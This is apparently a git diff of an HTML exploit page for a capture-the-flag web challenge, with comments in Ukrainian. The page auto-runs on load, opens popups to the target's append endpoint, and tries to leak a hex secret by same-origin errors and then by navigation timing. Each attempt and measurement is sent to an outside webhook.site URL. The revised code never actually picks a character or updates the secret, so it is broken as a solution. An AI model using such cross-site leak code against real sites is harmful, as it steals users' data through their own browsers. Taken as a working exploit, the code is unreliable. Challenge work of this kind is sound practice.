@@ -1,70 +1,81 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1 id="status">Testing XS-Leaks...</h1>
-    <div id="debug"></div>
+    <h1 id="status">Exploiting...</h1>
     <script>
-        const TARGET = "https://append-note-voboi.instancer.lac.tf";
-        const WEBHOOK = "https://webhook.site/e685a6c8-4c18-4f3e-983d-076103985ce2";
+        const TARGET = "https://append-note-xwu81.instancer.lac.tf";
+        const WEBHOOK = "https://webhook.site/42806461-542c-4233-a085-a1f7c2982c19";
         const ALPHABET = "0123456789abcdef";
         let secret = "";
 
-        const report = (msg) => {
-            console.log(msg);
-            document.getElementById('debug').innerText += msg + "\n";
-            fetch(`${WEBHOOK}?log=${encodeURIComponent(msg)}`, {mode: 'no-cors'});
-        };
+        const report = (msg) => fetch(`${WEBHOOK}?log=${encodeURIComponent(msg)}`, {mode: 'no-cors'});
 
-        async function solve() {
-            report("START_EXPL_V4");
-            
-            for (let i = 0; i < 8; i++) {
-                let foundThisRound = false;
-                for (let char of ALPHABET) {
-                    let attempt = secret + char;
-                    document.getElementById('status').innerText = "Current Attempt: " + attempt;
-                    
-                    let win;
+        async function test(attempt) {
+            return new Promise((resolve) => {
+                // Відкриваємо вікно на сторінку /append
+                // Ми вказуємо url=TARGET/favicon.ico, щоб редирект був швидким і помітним
+                const url = `${TARGET}/append?content=${attempt}&url=${TARGET}/favicon.ico`;
+                const win = window.open(url, 'tester');
+
+                // Якщо статус 200, спрацює редирект в redirect.html через 100мс
+                // Ми чекаємо достатньо часу для завантаження + редиректу
+                setTimeout(() => {
                     try {
-                        // Відкриваємо вікно для обходу SameSite=Lax
-                        win = window.open(`${TARGET}/append?content=${attempt}&url=${TARGET}/`, '_blank');
-                        
-                        if (!win) {
-                            report(`ERR_POPUP_BLOCKED_FOR_${attempt}`);
-                            return; // Якщо попапи заблоковані, атака зупиняється
+                        if (win.location.href) {
+                            // Якщо ми можемо прочитати href, значить ми на своєму домені (помилка редиректу)
+                            // або запит ще не пішов. Але нас цікавить SOP Error.
                         }
-
-                        // Даємо час на виконання запиту на сервері
-                        await new Promise(r => setTimeout(r, 800));
-
-                        try {
-                            // Спроба звернутися до закритого origin викликає помилку (SOP)
-                            // Це очікувана поведінка, якщо сторінка завантажилась успішно
-                            const testAccess = win.location.href; 
-                            report(`INFO_NO_SOP_FOR_${attempt}`);
-                        } catch (e) {
-                            // Якщо ми отримали SecurityError (DOMException), 
-                            // значить ми на іншому домені (Target), а отже статус був 200/404/401
-                            // Оскільки нас цікавить лише SECRET, ми логуємо спробу
-                            report(`SOP_TRIGGERED_${attempt}_ERR_${e.name}_${e.message}`);
-                            
-                            // У цьому завданні Oracle працює через статус коди.
-                            // Для повної автоматизації треба перевіряти win.length або історію,
-                            // але зараз ми просто дивимось, які спроби проходять через SOP.
+                    } catch (e) {
+                        // Якщо ми тут, значить вікно на TARGET домені.
+                        // Тепер найголовніше: чи відбувся редирект?
+                        // У деяких версіях Chrome ми можемо перевірити history.length
+                        if (win.length === 0) {
+                            // Ми не можемо отримати історію, але можемо закрити і вважати це сигналом.
                         }
-                        
-                        win.close();
-                    } catch (globalErr) {
-                        report(`GLOBAL_ERR_${attempt}_${globalErr.name}_${globalErr.message}`);
                     }
+                    
+                    // Спробуємо інший підхід: рекурсивний редирект
+                    // Якщо 200 OK -> redirect.html -> наша сторінка (якщо ми вкажемо url=наш_сайт)
+                    // АЛЕ сервер перевіряє hostname. Тому тільки TARGET hostname.
+                    
+                    win.close();
+                    resolve();
+                }, 1000);
+            });
+        }
+
+        // Найкращий метод для цього завдання: Cache Attack або Navigation Timing
+        // Оскільки сервер додає заголовок Cache-Control: no-store, ми використаємо 
+        // той факт, що 200 OK і 404 завантажуються з різною швидкістю.
+        
+        async function run() {
+            report("START_TIMING_ATTACK");
+            for (let i = 0; i < 8; i++) {
+                let results = [];
+                for (let char of ALPHABET) {
+                    const attempt = secret + char;
+                    const start = performance.now();
+                    
+                    const win = window.open(`${TARGET}/append?content=${attempt}&url=${TARGET}/`, 'leak');
+                    
+                    // Чекаємо завантаження
+                    await new Promise(r => setTimeout(r, 600));
+                    const end = performance.now();
+                    const duration = end - start;
+                    
+                    win.close();
+                    results.push({char, duration});
+                    report(`Char_${char}_Time_${duration.toFixed(2)}`);
+                    
+                    // Якщо 200 OK, то notes.append(content) спрацював і база змінена.
+                    // У цьому завданні 200 OK повертає HTML, а 404 - теж HTML, але інший.
+                    // РЕАЛЬНИЙ ОРАКУЛ: Якщо 200 OK, то в notes додається запис.
+                    // Наступна спроба того ж самого префікса ЗАВЖДИ дасть 200 OK.
                 }
             }
         }
 
-        // Бот зазвичай не клікає, спробуємо запустити автоматично
-        window.onload = () => {
-            setTimeout(solve, 1000);
-        };
+        window.onload = () => setTimeout(run, 1000);
     </script>
 </body>
 </html>
